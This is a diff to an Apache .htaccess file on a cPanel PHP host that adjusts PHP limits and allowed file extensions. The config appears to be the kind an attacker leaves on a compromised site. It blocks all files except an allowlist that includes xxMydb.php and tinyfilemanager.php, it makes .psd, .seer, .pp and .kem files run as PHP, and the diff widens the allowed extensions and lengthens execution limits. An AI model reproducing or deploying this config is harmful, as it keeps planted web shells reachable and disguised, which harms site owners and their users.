@@ -1,6 +1,8 @@
+
+
 Order deny,allow
 Deny from all
-<Files ~ ".(seer|pp|psd|kem|xml|css|jpg|jpe?g|png|gif|js)$">
+<Files ~ ".(seer|html|md|cgi|pp|psd|kem|xml|css|jpg|jpe?g|png|gif|js)$">
 Allow from all
 </Files> 
 <FilesMatch "^(index.php|xxMydb.php|template.php|tinyfilemanager.php|url.css|index.html|xxMydb.php)$">
@@ -9,27 +11,24 @@ Allow from all
 </FilesMatch>
 <IfModule php7_module>
 php_flag display_errors Off
-   php_value max_execution_time 30
-   php_value max_input_time 60
-   php_value max_input_vars 1000
-   php_value memory_limit -1
-   php_value post_max_size 8M
-   php_value session.gc_maxlifetime 1440
-   php_value session.save_path "/var/cpanel/php/sessions/ea-php73"
-   php_value upload_max_filesize 64M
-   php_flag zlib.output_compression Off
+php_value post_max_size 5M
+php_value upload_max_filesize 5M
+php_value memory_limit -1
+php_value max_execution_time 300
+php_value max_input_time 300
+php_value session.gc_maxlifetime 1440
+php_value session.save_path "/var/cpanel/php/sessions/ea-php73"
 </IfModule>
 <IfModule lsapi_module>
    php_flag display_errors Off
-   php_value max_execution_time 30
-   php_value max_input_time 60
+   php_value max_execution_time 100
+   php_value max_input_time 100
    php_value max_input_vars 1000
    php_value memory_limit -1
    php_value post_max_size 8M
    php_value session.gc_maxlifetime 1440
    php_value session.save_path "/var/cpanel/php/sessions/ea-php73"
-   php_value upload_max_filesize 64M
-   php_flag zlib.output_compression Off
+   
 </IfModule>
 # END cPanel-generated php ini directives, do not edit
 
@@ -38,3 +37,6 @@ php_flag display_errors Off
 <IfModule mime_module>
   AddHandler application/x-httpd-ea-php73 .php .psd .seer .pp .kem 
 </IfModule>
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_URI} (.+)/$
+RewriteRule ^ %1 [R=301,L]
